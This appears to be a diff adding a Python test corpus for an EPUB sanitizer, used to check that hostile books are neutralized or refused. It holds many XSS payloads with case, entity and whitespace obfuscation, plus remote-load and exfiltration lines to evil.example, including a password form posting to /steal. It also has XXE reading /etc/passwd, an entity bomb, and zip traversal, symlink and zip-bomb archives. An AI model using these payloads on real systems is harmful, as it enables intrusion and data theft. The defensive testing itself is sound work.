@@ -1,0 +1,385 @@
+# SPDX-License-Identifier: MIT
+"""The trapped-EPUB corpus: one case at least per attack vector (EF-BIB-051 (8), ENF-SEC-015).
+
+Every case is an EPUB built by `build.py` around one hostile entry. A case ends in one of two
+outcomes: `neutralized` (the EPUB is accepted and the derivative holds no active pattern) or
+`refused` (the archive or one XML entry is unsafe, so nothing is produced). Mutations of the main
+vectors (letter case, entity encoding, inserted whitespace) are generated, not written by hand.
+"""
+
+from __future__ import annotations
+
+from collections.abc import Iterator
+from functools import cache
+from dataclasses import dataclass
+from typing import Final, Literal
+
+from shelfhold.sdk.testing.corpus.trapped_epubs.build import (
+    EPUB_NS,
+    SVG_NS,
+    TINY_PNG,
+    XHTML_NS,
+    XLINK_NS,
+    Member,
+    epub_bytes,
+    xhtml,
+    zip_bytes,
+)
+
+Outcome = Literal["neutralized", "refused"]
+CHAPTER: Final = "OEBPS/ch1.xhtml"
+STYLESHEET: Final = "OEBPS/style.css"
+
+
+@dataclass(frozen=True)
+class Trap:
+    name: str
+    vector: str
+    epub: bytes
+    outcome: Outcome = "neutralized"
+    entry: str = CHAPTER  # the hostile entry, which must come out clean
+    reason: str = ""  # the stable word of a refusal
+
+
+def _page(name: str, vector: str, body: str, head: str = "") -> Trap:
+    return Trap(name, vector, epub_bytes(xhtml(body, head)))
+
+
+def _raw_page(name: str, vector: str, document: bytes, outcome: Outcome = "neutralized",
+              reason: str = "") -> Trap:  # fmt: skip
+    return Trap(name, vector, epub_bytes(document), outcome, CHAPTER, reason)
+
+
+def _svg(inner: str, attrs: str = "") -> str:
+    return f'<svg xmlns="{SVG_NS}" xmlns:xlink="{XLINK_NS}" viewBox="0 0 10 10"{attrs}>{inner}</svg>'
+
+
+_XML: Final = '<?xml version="1.0" encoding="utf-8"?>\n'
+
+
+def _scripts() -> list[Trap]:
+    ns = f'xmlns:x="{XHTML_NS}"'
+    return [
+        _page("script_plain", "script", "<p>a</p><script>alert(1)</script>"),
+        _page("script_src", "script", '<script src="http://evil.example/x.js"></script>'),
+        _page("script_in_head", "script", "<p>a</p>", "<script>alert(1)</script>"),
+        _page("script_uppercase", "script", "<SCRIPT>alert(1)</SCRIPT>"),
+        _page("script_mixed_case", "script", "<ScRiPt>alert(1)</ScRiPt>"),
+        _page("script_cdata", "script", "<script><![CDATA[alert(1)]]></script>"),
+        _page("script_prefixed_xhtml", "script", f"<x:script {ns}>alert(1)</x:script>"),
+        _page("script_svg", "script", _svg("<script>alert(1)</script>")),
+        _page("script_svg_prefixed", "script", f'<s:svg xmlns:s="{SVG_NS}"><s:script>alert(1)</s:script></s:svg>'),
+        _page("script_svg_href", "script", _svg('<script xlink:href="http://evil.example/x.js"/>')),
+        _page("script_in_noscript", "script", "<noscript><script>alert(1)</script></noscript>"),
+        _page("script_in_template", "script", "<template><script>alert(1)</script></template>"),
+        _page("script_in_style_text", "script", "<style>p{color:red}</style><p>x</p>", "<script>1</script>"),
+        _page("script_split_by_comment", "script", "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>"),
+    ]  # fmt: skip
+
+
+def _handlers() -> list[Trap]:
+    return [
+        _page("handler_onerror", "handler", '<img src="cover.png" onerror="alert(1)" alt=""/>'),
+        _page("handler_onclick", "handler", '<p onclick="alert(1)">x</p>'),
+        _page("handler_upper", "handler", '<p ONMOUSEOVER="alert(1)">x</p>'),
+        _page("handler_mixed", "handler", '<p oNfOcUs="alert(1)" autofocus="autofocus" tabindex="0">x</p>'),
+        _page("handler_svg_onload", "handler", _svg("<rect width='1' height='1'/>", ' onload="alert(1)"')),
+        _page("handler_svg_child", "handler", _svg('<circle r="1" onmouseover="alert(1)"/>')),
+        _page("handler_epub_ns", "handler", f'<p xmlns:e="{EPUB_NS}" e:onclick="alert(1)">x</p>'),
+        _page("handler_onpointerenter", "handler", '<div onpointerenter="alert(1)">x</div>'),
+        _page("handler_onanimationstart", "handler", '<p style="animation:a" onanimationstart="alert(1)">x</p>'),
+    ]  # fmt: skip
+
+
+def _script_urls() -> list[Trap]:
+    def link(href: str, tag: str = "a", attr: str = "href") -> str:
+        return f'<{tag} {attr}="{href}">x</{tag}>'
+
+    return [
+        _page("url_javascript", "javascript-url", link("javascript:alert(1)")),
+        _page("url_javascript_upper", "javascript-url", link("JAVASCRIPT:alert(1)")),
+        _page("url_javascript_entities", "javascript-url", link("&#106;&#97;&#118;&#97;script:alert(1)")),
+        _page("url_javascript_hex_entities", "javascript-url", link("&#x6A;&#x61;vascript:alert(1)")),
+        _page("url_javascript_padded_entity", "javascript-url", link("&#0000106;avascript:alert(1)")),
+        _page("url_javascript_tab", "javascript-url", link("java&#9;script:alert(1)")),
+        _page("url_javascript_newline", "javascript-url", link("java&#10;script:alert(1)")),
+        _page("url_javascript_cr", "javascript-url", link("java&#13;script:alert(1)")),
+        _page("url_javascript_leading_space", "javascript-url", link("   javascript:alert(1)")),
+        _page("url_javascript_leading_control", "javascript-url", link("&#1;javascript:alert(1)")),
+        _page("url_vbscript", "javascript-url", link("vbscript:msgbox(1)")),
+        _page("url_data_html", "data-url", link("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")),
+        _page("url_data_html_plain", "data-url", link("data:text/html,<script>alert(1)</script>".replace("<", "&lt;"))),
+        _page("url_data_in_img_svg", "data-url", '<img src="data:image/svg+xml;base64,PHN2Zy8+" alt=""/>'),
+        _page("url_data_in_object", "data-url", link("data:text/html,x", "object", "data")),
+        _page("url_javascript_form_action", "javascript-url", '<form action="javascript:alert(1)"><button>go</button></form>'),
+        _page("url_javascript_formaction", "javascript-url", '<form><button formaction="javascript:alert(1)">go</button></form>'),
+        _page("url_javascript_svg_a", "javascript-url", _svg('<a xlink:href="javascript:alert(1)"><text>x</text></a>')),
+        _page("url_javascript_svg_a_href", "javascript-url", _svg('<a href="javascript:alert(1)"><text>x</text></a>')),
+        _page("url_javascript_img", "javascript-url", link("javascript:alert(1)", "img", "src")),
+        _page("url_javascript_area", "javascript-url", '<map name="m"><area href="javascript:alert(1)" shape="default"/></map>'),
+        _page("url_protocol_relative_a", "remote-resource", link("//evil.example/x")),
+        _page("url_backslash_relative", "remote-resource", link("\\\\evil.example\\x", "img", "src")),
+    ]  # fmt: skip
+
+
+def _frames() -> list[Trap]:
+    return [
+        _page("iframe", "iframe", '<iframe src="http://evil.example/"></iframe>'),
+        _page("iframe_srcdoc", "iframe", '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'),
+        _page("iframe_upper", "iframe", '<IFRAME src="x.xhtml"></IFRAME>'),
+        _page("frameset", "iframe", '<frameset><frame src="http://evil.example/"/></frameset>'),
+        _page("object", "object", '<object data="http://evil.example/x.swf" type="application/x-shockwave-flash"></object>'),
+        _page("object_internal", "object", '<object data="x.svg" type="image/svg+xml"></object>'),
+        _page("embed", "embed", '<embed src="http://evil.example/x.swf"/>'),
+        _page("applet", "embed", '<applet code="X.class"></applet>'),
+        _page("form", "form", '<form action="http://evil.example/steal" method="post"><input name="p" type="password"/></form>'),
+        _page("form_no_action", "form", '<form><input type="text" name="q"/><button type="submit">go</button></form>'),
+        _page("base", "base", "<p>a</p>", '<base href="http://evil.example/"/>'),
+        _page("meta_refresh", "meta-refresh", "<p>a</p>", '<meta http-equiv="refresh" content="0;url=http://evil.example/"/>'),
+        _page("meta_refresh_upper", "meta-refresh", "<p>a</p>", '<META HTTP-EQUIV="Refresh" CONTENT="0;url=javascript:alert(1)"/>'),
+        _page("meta_csp", "meta-refresh", "<p>a</p>", '<meta http-equiv="Content-Security-Policy" content="default-src *"/>'),
+        _page("link_remote_stylesheet", "link-remote", "<p>a</p>", '<link rel="stylesheet" href="http://evil.example/x.css"/>'),
+        _page("link_protocol_relative", "link-remote", "<p>a</p>", '<link rel="stylesheet" href="//evil.example/x.css"/>'),
+        _page("link_prefetch", "link-remote", "<p>a</p>", '<link rel="prefetch" href="http://evil.example/"/>'),
+        _page("link_import", "link-remote", "<p>a</p>", '<link rel="import" href="x.html"/>'),
+        _page("video_poster", "remote-resource", '<video src="http://evil.example/v.mp4" poster="http://evil.example/p.png"></video>'),
+        _page("audio", "remote-resource", '<audio src="http://evil.example/a.mp3"></audio>'),
+    ]  # fmt: skip
+
+
+def _remote() -> list[Trap]:
+    return [
+        _page("img_remote", "remote-resource", '<img src="http://evil.example/p.png" alt=""/>'),
+        _page("img_remote_https", "remote-resource", '<img src="https://evil.example/p.png" alt=""/>'),
+        _page("img_protocol_relative", "remote-resource", '<img src="//evil.example/p.png" alt=""/>'),
+        _page("img_srcset", "remote-resource", '<img src="cover.png" srcset="http://evil.example/p.png 2x" alt=""/>'),
+        _page("img_ftp", "remote-resource", '<img src="ftp://evil.example/p.png" alt=""/>'),
+        _page("svg_image_remote", "remote-resource", _svg('<image xlink:href="http://evil.example/p.png" width="1" height="1"/>')),
+        _page("svg_image_href_remote", "remote-resource", _svg('<image href="https://evil.example/p.png" width="1" height="1"/>')),
+        _page("body_background", "remote-resource", '<table background="http://evil.example/p.png"><tr><td>x</td></tr></table>'),
+        _page("blockquote_cite", "remote-resource", '<blockquote cite="http://evil.example/">x</blockquote>'),
+    ]  # fmt: skip
+
+
+def _svg_cases() -> list[Trap]:
+    return [
+        _page("svg_foreignobject", "svg", _svg("<foreignObject><p xmlns='%s'>x<script>alert(1)</script></p></foreignObject>" % XHTML_NS)),
+        _page("svg_foreignobject_iframe", "svg", _svg("<foreignObject><iframe xmlns='%s' src='http://evil.example/'/></foreignObject>" % XHTML_NS)),
+        _page("svg_foreignobject_lower", "svg", _svg("<foreignobject><body xmlns='%s' onload='alert(1)'/></foreignobject>" % XHTML_NS)),
+        _page("svg_use_remote_xlink", "svg", _svg('<use xlink:href="http://evil.example/x.svg#a"/>')),
+        _page("svg_use_remote_href", "svg", _svg('<use href="//evil.example/x.svg#a"/>')),
+        _page("svg_use_data", "svg", _svg('<use href="data:image/svg+xml;base64,PHN2Zy8+#a"/>')),
+        _page("svg_animate_href", "svg", _svg('<a xlink:href="#"><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a>')),
+        _page("svg_animate_xlink_href", "svg", _svg('<a><animate attributeName="xlink:href" to="javascript:alert(1)"/></a>')),
+        _page("svg_set_href", "svg", _svg('<a><set attributeName="href" to="javascript:alert(1)"/><text>x</text></a>')),
+        _page("svg_animate_transform", "svg", _svg('<rect width="1" height="1"><animateTransform attributeName="transform" type="rotate" from="0" to="1" onend="alert(1)"/></rect>')),
+        _page("svg_handler_on_animation", "svg", _svg('<rect width="1" height="1"><animate attributeName="x" onbegin="alert(1)"/></rect>')),
+        _page("svg_style_import", "svg", _svg("<style>@import url(http://evil.example/x.css);</style>")),
+        _page("svg_style_url", "svg", _svg("<style>rect{fill:url(http://evil.example/x.svg#a)}</style>")),
+        _page("svg_fill_url_remote", "svg", _svg('<rect width="1" height="1" fill="url(http://evil.example/x.svg#a)"/>')),
+        _page("svg_filter_url_remote", "svg", _svg('<rect width="1" height="1" filter="url(//evil.example/x.svg#f)"/>')),
+        _page("svg_feimage", "svg", _svg('<filter id="f"><feImage xlink:href="http://evil.example/p.png"/></filter>')),
+        _page("svg_handler_upper", "svg", _svg('<g ONCLICK="alert(1)"><path d="M0 0"/></g>')),
+        _page("svg_mpath_remote", "svg", _svg('<path id="p" d="M0 0"/><animateMotion><mpath xlink:href="http://evil.example/p.svg#p"/></animateMotion>')),
+        _page("svg_set_style", "svg", _svg('<rect width="1" height="1"><set attributeName="style" to="background:url(http://evil.example/)"/></rect>')),
+    ]  # fmt: skip
+
+
+def _css() -> list[Trap]:
+    def style(css: str) -> Trap:
+        return _page(f"style_{len(css)}", "css", "<p>x</p>", f"<style>{css}</style>")
+
+    sheets = {
+        "style_url_remote": "p{background:url(http://evil.example/p.png)}",
+        "style_url_https_quoted": "p{background:url('https://evil.example/p.png')}",
+        "style_url_protocol_relative": "p{background:url(//evil.example/p.png)}",
+        "style_import": '@import "http://evil.example/x.css";',
+        "style_import_url": "@import url(http://evil.example/x.css);",
+        "style_import_relative": '@import "other.css";',
+        "style_import_upper": "@IMPORT URL(HTTP://EVIL.EXAMPLE/X.CSS);",
+        "style_escape_url": "p{background:u\\72l(http://evil.example/p.png)}",
+        "style_escape_hex": "p{background:\\75rl(http://evil.example/p.png)}",
+        "style_comment_url": "p{background:url/**/(http://evil.example/p.png)}",
+        "style_expression": "p{width:expression(alert(1))}",
+        "style_behavior": "p{behavior:url(x.htc)}",
+        "style_moz_binding": "p{-moz-binding:url(http://evil.example/x.xml#a)}",
+        "style_font_face_remote": "@font-face{font-family:x;src:url(http://evil.example/x.woff)}",
+        "style_image_set": 'p{background:image-set("http://evil.example/p.png" 1x)}',
+        "style_javascript": "p{background:url(javascript:alert(1))}",
+        "style_data_url": "p{background:url(data:text/html,x)}",
+        "style_close_tag": "p{color:red}</style><script>alert(1)</script><style>",
+    }
+    out = [_page(name, "css", "<p>x</p>", f"<style>{css.replace('<', '&lt;')}</style>")
+           for name, css in sheets.items()]  # fmt: skip
+    out += [
+        _page("style_attr_url", "css", '<p style="background:url(http://evil.example/p.png)">x</p>'),
+        _page("style_attr_import_like", "css", '<p style="background:url(&#x68;ttp://evil.example/p.png)">x</p>'),
+        _page("style_attr_expression", "css", '<p style="width:expression(alert(1))">x</p>'),
+        _page("style_attr_escape", "css", '<p style="background:\\75rl(//evil.example/)">x</p>'),
+        _page("style_attr_svg", "css", _svg('<rect width="1" height="1" style="fill:url(http://evil.example/a.svg#a)"/>')),
+    ]  # fmt: skip
+    sheet_files = {
+        "css_file_import": b'@import url("http://evil.example/x.css");\np{color:red}\n',
+        "css_file_url": b"p{background:url(http://evil.example/p.png)}\n",
+        "css_file_font": b"@font-face{font-family:x;src:url(//evil.example/x.woff)}\n",
+        "css_file_escape": b"p{background:u\\72l(http://evil.example/p.png)}\n",
+        "css_file_expression": b"p{width:expression(alert(1))}\n",
+        "css_file_import_relative": b'@import "other.css";\n',
+    }
+    out += [Trap(n, "css", epub_bytes(xhtml("<p>x</p>"), css=c), entry=STYLESHEET)
+            for n, c in sheet_files.items()]  # fmt: skip
+    return out
+
+
+def _entities_and_xml() -> list[Trap]:
+    def doc(doctype: str, body: str = "<p>&xxe;</p>") -> bytes:
+        return (f'{_XML}{doctype}\n<html xmlns="{XHTML_NS}"><head><title>T</title></head>'
+                f"<body>{body}</body></html>").encode()  # fmt: skip
+
+    laughs = "".join(
+        f'<!ENTITY l{i} "{"&l%d;" % (i - 1) * 10}">' if i else '<!ENTITY l0 "lol">' for i in range(9)
+    )
+    return [
+        _raw_page("xxe_file", "xxe", doc('<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'), "refused", "dtd"),
+        _raw_page("xxe_http", "xxe", doc('<!DOCTYPE html [<!ENTITY xxe SYSTEM "http://evil.example/x">]>'), "refused", "dtd"),
+        _raw_page("xxe_parameter_entity", "xxe", doc('<!DOCTYPE html [<!ENTITY % p SYSTEM "http://evil.example/x.dtd">%p;]>', "<p>x</p>"), "refused", "dtd"),
+        _raw_page("xxe_external_dtd", "xxe", doc('<!DOCTYPE html SYSTEM "http://evil.example/x.dtd">', "<p>x</p>"), "neutralized"),
+        _raw_page("billion_laughs", "entity-bomb", doc(f"<!DOCTYPE html [{laughs}]>", "<p>&l8;</p>"), "refused", "dtd"),
+        _raw_page("internal_entity", "entity-bomb", doc('<!DOCTYPE html [<!ENTITY a "b">]>', "<p>&a;</p>"), "refused", "dtd"),
+        _raw_page("undefined_entity", "entity-bomb", doc("", "<p>&nope;</p>"), "refused", "malformed"),
+        _raw_page("malformed_xml", "xxe", b"<html><p>unclosed", "refused", "malformed"),
+        _raw_page("doctype_public_plain", "xxe", doc('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">', "<p>a&nbsp;b<script>alert(1)</script></p>")),
+        Trap("xxe_in_svg_file", "xxe", epub_bytes(xhtml("<p>x</p>"), extra=[Member(
+            "OEBPS/pic.svg", f'{_XML}<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="{SVG_NS}"><text>&xxe;</text></svg>'.encode())],
+            opf_extra='<item id="pic" href="pic.svg" media-type="image/svg+xml"/>'), "refused", "dtd", "OEBPS/pic.svg"),
+        Trap("deeply_nested", "entity-bomb", epub_bytes(xhtml("<div>" * 200 + "x" + "</div>" * 200)), "refused", "too_deep"),
+    ]  # fmt: skip
+
+
+def _standalone_files() -> list[Trap]:
+    svg_script = f'{_XML}<svg xmlns="{SVG_NS}" onload="alert(1)"><script>alert(1)</script></svg>'.encode()
+    svg_use = f'{_XML}<svg xmlns="{SVG_NS}" xmlns:xlink="{XLINK_NS}"><use xlink:href="http://evil.example/x.svg#a"/></svg>'.encode()
+    html_page = f'{_XML}<html xmlns="{XHTML_NS}"><head><title>T</title></head><body><p onclick="alert(1)">x</p><script>1</script></body></html>'.encode()
+    return [
+        Trap("svg_file_script", "svg", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/pic.svg", svg_script)], opf_extra='<item id="pic" href="pic.svg" media-type="image/svg+xml"/>'), entry="OEBPS/pic.svg"),
+        Trap("svg_file_use_remote", "svg", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/pic.svg", svg_use)], opf_extra='<item id="pic" href="pic.svg" media-type="image/svg+xml"/>'), entry="OEBPS/pic.svg"),
+        Trap("svg_file_undeclared", "svg", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/hidden.svg", svg_script)]), entry="OEBPS/hidden.svg"),
+        Trap("html_extension_page", "script", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/extra.html", html_page)]), entry="OEBPS/extra.html"),
+        Trap("htm_extension_page", "script", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/extra.htm", html_page)]), entry="OEBPS/extra.htm"),
+        Trap("xhtml_manifest_odd_extension", "script", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/extra.dat", html_page)], opf_extra='<item id="x" href="extra.dat" media-type="application/xhtml+xml"/>'), entry="OEBPS/extra.dat"),
+        Trap("svg_in_jpg", "disguise", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/p.jpg", svg_script)]), "refused", "disguised", "OEBPS/p.jpg"),
+        Trap("html_in_png", "disguise", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/p.png", b"<!DOCTYPE html><script>alert(1)</script>")]), "refused", "disguised", "OEBPS/p.png"),
+        Trap("html_in_xml", "disguise", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/data.xml", html_page)]), entry="OEBPS/data.xml"),
+    ]  # fmt: skip
+
+
+def _archives() -> list[Trap]:
+    page = epub_bytes
+    ok = xhtml("<p>x</p>")
+    bomb = Member("OEBPS/big.bin", b"\0" * (64 * 1024 * 1024))
+    return [
+        Trap("zip_traversal", "archive", page(ok, extra=[Member("../evil.xhtml", b"x")]), "refused", "unsafe_path"),
+        Trap("zip_traversal_nested", "archive", page(ok, extra=[Member("OEBPS/../../evil", b"x")]), "refused", "unsafe_path"),
+        Trap("zip_absolute", "archive", page(ok, extra=[Member("/etc/cron.d/x", b"x")]), "refused", "unsafe_path"),
+        Trap("zip_drive_path", "archive", page(ok, extra=[Member("C:/x", b"x")]), "refused", "unsafe_path"),
+        Trap("zip_backslash", "archive", page(ok, extra=[Member("OEBPS\\..\\x", b"x")]), "refused", "unsafe_path"),
+        Trap("zip_symlink", "archive", page(ok, extra=[Member("OEBPS/link.xhtml", b"/etc/passwd", attr=0o120777 << 16)]), "refused", "symlink"),
+        Trap("zip_bomb", "archive", page(ok, extra=[bomb]), "refused", "ratio"),
+        Trap("zip_duplicate_name", "archive", page(ok, extra=[Member("OEBPS/ch1.xhtml", b"<p>x</p>")]), "refused", "duplicate_name"),
+        Trap("zip_duplicate_case", "archive", page(ok, extra=[Member("OEBPS/CH1.xhtml", b"<p>x</p>")]), "refused", "duplicate_name"),
+        Trap("zip_duplicate_unicode", "archive", zip_bytes([Member("mimetype", b"application/epub+zip", False), Member("a/\u00e9.xhtml", b"x"), Member("a/e\u0301.xhtml", b"x")]), "refused", "duplicate_name"),
+        Trap("zip_not_an_archive", "archive", b"<html><script>alert(1)</script></html>", "refused", "unsupported_format"),
+        Trap("zip_mimetype_missing", "archive", page(ok, first=[]), "refused", "mimetype"),
+        Trap("zip_mimetype_not_first", "archive", page(ok, first=[Member("OEBPS/z.txt", b"z"), Member("mimetype", b"application/epub+zip", False)]), "refused", "mimetype"),
+        Trap("zip_mimetype_wrong", "archive", page(ok, first=[Member("mimetype", b"text/html", False)]), "refused", "mimetype"),
+        Trap("zip_opf_missing", "archive", zip_bytes([Member("mimetype", b"application/epub+zip", False), Member("OEBPS/ch1.xhtml", ok)]), "refused", "container"),
+    ]  # fmt: skip
+
+
+def base_traps() -> tuple[Trap, ...]:
+    return tuple(
+        _scripts() + _handlers() + _script_urls() + _frames() + _remote() + _svg_cases() + _css()
+        + _entities_and_xml() + _standalone_files() + _archives()
+    )
+
+
+# --- Mutations -----------------------------------------------------------------------------------
+
+
+def _case_variants(word: str) -> Iterator[str]:
+    yield word.upper()
+    yield word.capitalize()
+    yield "".join(c.upper() if i % 2 else c for i, c in enumerate(word))
+    yield "".join(c.upper() if i % 2 == 0 else c for i, c in enumerate(word))
+
+
+def _entity_variants(word: str) -> Iterator[str]:
+    yield "".join(f"&#{ord(c)};" for c in word)
+    yield "".join(f"&#x{ord(c):x};" for c in word)
+    yield "".join(f"&#x{ord(c):X};" for c in word)
+    yield "".join(f"&#{ord(c):07d};" for c in word)
+    yield word[0] + "".join(f"&#{ord(c)};" for c in word[1:])
+    yield "".join(f"&#{ord(c)};" if i % 2 else c for i, c in enumerate(word))
+
+
+def _split_variants(word: str) -> Iterator[str]:
+    for filler in ("&#9;", "&#10;", "&#13;", "&#9;&#10;&#13;", " "):
+        yield word[:4] + filler + word[4:]
+        yield filler + word
+    yield "&#1;&#2;&#3;" + word
+    yield "&#x0A;".join(word)
+
+
+def _scheme_variants(scheme: str) -> Iterator[str]:
+    seen: set[str] = set()
+    for gen in (_case_variants, _entity_variants, _split_variants):
+        for variant in gen(scheme):
+            if variant not in seen:
+                seen.add(variant)
+                yield variant
+
+
+def mutation_traps() -> tuple[Trap, ...]:
+    """The same vectors under other letter cases, entity encodings and inserted whitespace."""
+    out: list[Trap] = []
+    n = 0
+    for scheme in ("javascript", "vbscript"):
+        for variant in _scheme_variants(scheme):
+            n += 1
+            out.append(_page(f"mut_scheme_{n}", "mutation", f'<a href="{variant}:alert(1)">x</a>'))
+            out.append(_page(f"mut_scheme_img_{n}", "mutation", f'<img src="{variant}:alert(1)" alt=""/>'))
+    for variant in _scheme_variants("data"):
+        n += 1
+        out.append(_page(f"mut_data_{n}", "mutation", f'<a href="{variant}:text/html,x">x</a>'))
+    for tag in ("script", "iframe", "object", "embed", "form", "base", "foreignObject"):
+        for variant in _case_variants(tag):
+            n += 1
+            out.append(_page(f"mut_tag_{n}", "mutation", f"<{variant}>x</{variant}>"))
+            out.append(_page(f"mut_tag_svg_{n}", "mutation", _svg(f"<{variant}>x</{variant}>")))
+    for attr in ("onerror", "onclick", "onload", "onmouseover", "onfocus"):
+        for variant in _case_variants(attr):
+            n += 1
+            out.append(_page(f"mut_handler_{n}", "mutation", f'<p {variant}="alert(1)">x</p>'))
+            out.append(_page(f"mut_handler_svg_{n}", "mutation", _svg(f'<g {variant}="alert(1)"/>')))
+    for variant in _scheme_variants("url"):
+        n += 1
+        out.append(_page(f"mut_css_{n}", "mutation", f'<p style="background:{variant}(http://evil.example/)">x</p>'))
+    for variant in _entity_variants("http"):
+        n += 1
+        out.append(_page(f"mut_remote_{n}", "mutation", f'<img src="{variant}://evil.example/p.png" alt=""/>'))
+    for variant in _case_variants("@import"):
+        n += 1
+        out.append(_page(f"mut_import_{n}", "mutation", "<p>x</p>", f"<style>{variant} url(http://evil.example/x.css);</style>"))
+    return tuple(out)
+
+
+@cache
+def all_traps() -> tuple[Trap, ...]:
+    return base_traps() + mutation_traps()
+
+
+VECTOR_FAMILIES: Final = (
+    "script", "handler", "javascript-url", "data-url", "iframe", "object", "embed", "form", "base",
+    "meta-refresh", "link-remote", "svg", "css", "remote-resource", "xxe", "entity-bomb", "archive",
+    "disguise", "mutation",
+)  # fmt: skip
